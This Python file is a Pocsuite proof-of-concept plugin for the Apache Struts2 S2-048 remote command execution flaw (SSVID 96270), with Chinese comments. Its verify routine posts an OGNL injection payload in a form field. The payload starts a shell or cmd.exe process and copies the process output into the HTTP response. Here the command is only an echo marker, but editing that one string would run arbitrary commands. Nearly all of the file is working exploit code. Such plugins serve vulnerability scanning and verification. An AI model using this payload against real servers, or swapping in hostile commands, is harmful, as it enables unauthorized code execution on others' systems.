#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import string
import urllib2
from collections import OrderedDict

from pocsuite.api.request import req  #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


def post(url, data):
    req = urllib2.Request(url)
    data = urllib.urlencode(data)
    # enable cookie
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    response = opener.open(req, data)
    return response.read()

class TestPOC(POCBase):
    vulID = '96270'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = 'lyb'  #  PoC作者的大名
    vulDate = '2018/4/8'  #漏洞公开的时间,不知道就写今天
    createDate = '2018/4/8'  # 编写 PoC 的日期
    updateDate = '2018/4/8'  # PoC 更新的时间,默认和编写时间一样
    references = [
        'https://www.seebug.org/vuldb/ssvid-96270']  # 漏洞地址来源,0day不用写
    name = 'struts2-048 命令执行漏洞 PoC'  # PoC 名称
    appPowerLink = 'https://www.seebug.org/'  # 漏洞厂商主页地址
    appName = 'struts2'  # 漏洞应用名称
    appVersion = '2.3.x'  # 漏洞影响版本
    vulType = 'Command Execution	'  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        当开发者使用Struts2 Struts1的插件时，可能会因为不受信任的输入导致远程命令执行漏洞的产生。通过官方的Demo：Struts2-showcase验证该远程命令执行漏洞。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _attack(self):
        '''attack mode'''
        return self._verify()


    def _verify(self):
        '''verify mode'''
        result = {}
        posturl = self.url
        data = {
            'name': "${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='echo s2-048-EXISTS').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
            'age': 'bbb', '__checkbox_bustedBefore': 'true', 'description': 'ccc'}
        res = post(posturl, data)[:100]
        if 's2-048-EXISTS' in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
